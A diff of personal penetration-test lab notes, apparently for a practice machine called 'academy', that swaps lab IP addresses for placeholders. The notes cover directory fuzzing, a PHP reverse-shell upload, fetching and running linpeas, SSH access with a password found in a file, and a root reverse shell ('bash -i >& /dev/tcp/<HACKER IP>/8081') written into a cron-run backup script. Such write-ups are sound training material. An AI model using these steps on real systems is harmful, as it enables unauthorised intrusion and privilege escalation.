@@ -20,11 +20,11 @@ for port 21:
 
 	$ dirb http://<ip> -> take so long
 
-	$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.50.142/FUZZ -> academy phpmyadmin server-status
+	$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://<VICTIM IP>/FUZZ -> academy phpmyadmin server-status
 
-		lets go to http://192.168.50.142/academy -> input id and pass -> WORKS
+		lets go to http://<VICTIM IP>/academy -> input id and pass -> WORKS
 
-		uploads to http://192.168.50.142/academy/studentphoto/ folder
+		uploads to http://<VICTIM IP>/academy/studentphoto/ folder
 
 		using https://github.com/pentestmonkey/php-reverse-shell
 
@@ -39,13 +39,13 @@ for port 21:
 
 		using linpeas https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS -> download -> put in transfers folder -> cd to it and host webserver $ python3 -m http.server 80
 
-		now on academy $ cd /tmp -> $ wget http://192.168.50.228/linpeas.sh -> chmod it and run it -> looking for red stuff
+		now on academy $ cd /tmp -> $ wget http://<HACKER IP>/linpeas.sh -> chmod it and run it -> looking for red stuff
 
 		FOUND:
 			grimmie administrator 112 May 30  2021 /home/grimmie/backup.sh
 			$mysql_password = "My_V3ryS3cur3_P4ss";
 
-		tried ssh grimmie@192.168.50.142  with My_V3ryS3cur3_P4ss pass -> worked
+		tried ssh grimmie@<VICTIM IP>  with My_V3ryS3cur3_P4ss pass -> worked
 		
 		there is backup.sh that could be uset to create reverse shell for root!!! (linpeas again?!?)
 		
@@ -57,6 +57,6 @@ for port 21:
 			2023/03/12 06:34:01 CMD: UID=0     PID=13994  | /bin/bash /home/grimmie/backup.sh 
 			2023/03/12 06:34:01 CMD: UID=0     PID=13995  | /bin/bash /home/grimmie/backup.sh 
 			
-		using this https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet -> in bachup shell script $ bash -i >& /dev/tcp/192.168.50.228/8081 0>&1
+		using this https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet -> in bachup shell script $ bash -i >& /dev/tcp/<HACKER IP>/8081 0>&1
 		do $ nc -nvlp 8081
-		edit bachup script so that it contains only "bash -i >& /dev/tcp/192.168.50.228/8081 0>&1" and w8 for the reverse shell
+		edit bachup script so that it contains only "bash -i >& /dev/tcp/<HACKER IP>/8081 0>&1" and w8 for the reverse shell
